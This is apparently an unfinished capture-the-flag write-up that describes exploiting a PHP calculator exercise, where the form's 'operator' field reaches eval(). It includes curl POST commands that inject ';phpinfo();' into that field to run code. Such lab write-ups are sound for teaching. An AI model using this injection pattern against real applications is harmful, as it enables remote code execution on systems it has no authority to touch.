# Work in progress...

1.	Inspect form's fields in order to identify where to put `phpinfo()`. After
	some trials seems that `operand1` and `operand2` must be numbers, then
	`operator` should be the veicle of the attack.

2.	In the normal behaviour, the app replies with

		The result of X + Y is: Z

	where `Z` could be the result of an `eval()`.

5.	Let's try to force the `operator` field. The following commmand produces an
	intersting thing...

		curl -XPOST --data "operand1=1&operand2=1&operator=;" \
			http://ctf.infosecinstitute.com/ctf2/exercises/ex2.php

	Maybe this could be the solution

		curl -XPOST --data "operand1=1&operand2=1&operator=;phpinfo();" \
			http://ctf.infosecinstitute.com/ctf2/exercises/ex2.php

	Yep!
